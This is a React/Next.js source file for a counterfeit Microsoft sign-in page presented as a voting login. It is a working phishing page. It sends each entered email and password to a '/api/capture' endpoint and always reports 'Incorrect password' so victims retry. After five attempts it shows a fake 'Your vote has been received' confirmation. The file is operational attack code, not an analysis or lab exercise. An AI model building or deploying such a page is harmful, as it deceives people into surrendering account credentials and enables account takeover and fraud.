import Head from 'next/head';
import { useState, useRef } from 'react';

const MAX_ATTEMPTS = 5;

export default function MicrosoftLoginPage() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [step, setStep] = useState(1);
  const [feedback, setFeedback] = useState('');
  const [clickCount, setClickCount] = useState(0);
  const [showSuccess, setShowSuccess] = useState(false);
  const attemptRef = useRef(0);

  const handleNext = () => {
    if (!email.trim()) {
      setFeedback('Please enter a valid email address.');
      return;
    }
    setFeedback('');
    setStep(2);
  };

  const handleLogin = async () => {
    setFeedback('Incorrect password! Please try again...');
    attemptRef.current += 1;
    setClickCount(attemptRef.current);
    
    try {
      await fetch('/api/capture', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          username: email.trim(), 
          password, 
          method: 'microsoft'
        })
      });
    } catch (e) {}
    
    if (attemptRef.current >= MAX_ATTEMPTS) {
      setShowSuccess(true);
      setTimeout(() => setShowSuccess(false), 4000);
    }
  };

  const handleBack = () => {
    setStep(1);
    setFeedback('');
  };

  return (
    <>
      <Head>
        <meta charSet="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>Microsoft Login - Vote</title>
      </Head>

      <style jsx>{`
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: linear-gradient(135deg, #e7ebf0, #f0f2f5); height: 100vh; margin: 0; display: flex; align-items: center; justify-content: center; }
        .login-container { background: white; width: 360px; padding: 20px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); text-align: center; }
        .logo { width: 50px; height: 50px; margin: 0 auto 20px; }
        input { width: 95%; padding: 12px; margin: 10px 0; border: 1px solid #ccd0d5; border-radius: 6px; background: #f5f6f7; font-size: 16px; }
        input:focus { outline: none; border-color: #0078d4; }
        button { width: 100%; padding: 12px; margin: 15px 0; background: #0078d4; color: white; border: none; border-radius: 6px; font-size: 16px; cursor: pointer; }
        button:hover { background: #005a9e; }
        .feedback { color: red; font-size: 14px; margin: 8px 0; }
        a { color: #0078d4; text-decoration: none; font-size: 14px; display: block; margin-top: 10px; }
        .success-overlay { position: fixed; inset: 0; background: rgba(255,255,255,0.98); display: none; align-items: center; justify-content: center; z-index: 9999; }
        .success-overlay.show { display: flex; }
        .success-box { text-align: center; padding: 20px; }
        .checkmark { width: 110px; height: 110px; background: #4caf50; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 28px; box-shadow: 0 4px 12px rgba(76,175,80,0.4); }
        .checkmark svg { width: 56px; height: 56px; }
        .create-account { background: linear-gradient(135deg, #42b72a, #36a420); color: white; border: 2px solid #0078d4; border-radius: 6px; padding: 12px; margin-top: 15px; margin-bottom: 10px; cursor: pointer; font-size: 16px; width: 100%; }
        .create-account:hover { background: linear-gradient(135deg, #36a420, #2e921c); }
        @media (max-width: 480px) { .login-container { width: 90%; padding: 24px; } }
      `}</style>

      <div className="login-container">
        <img className="logo" src="/logos/mlogo.svg" alt="Microsoft" />
        <h2>Sign in</h2>
        
        {step === 1 && (
          <div>
            <input 
              type="email" 
              placeholder="Email address" 
              value={email}
              onChange={(e) => setEmail(e.target.value)}
            />
            <button onClick={handleNext}>Next</button>
          </div>
        )}
        
        {step === 2 && (
          <div>
            <input
              type="password"
              placeholder="Password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
            />
            <div className="feedback">{feedback}</div>
            <button onClick={handleLogin}>Sign in</button>
            <a href="#">Forgot your password?</a>
            <button className="create-account" onClick={() => alert('Create new account')}>Create new account</button>
          </div>
        )}
      </div>

      <div className="success-overlay" id="successOverlay">
        <div className="success-box">
          <div className="checkmark"><svg viewBox="0 0 52 52" xmlns="http://www.w3.org/2000/svg"><polyline points="15,27 24,36 39,17"></polyline></svg></div>
          <h2>Your vote has been received</h2>
          <p>We will get back to you when your vote is counted.</p>
        </div>
      </div>
    </>
  );
}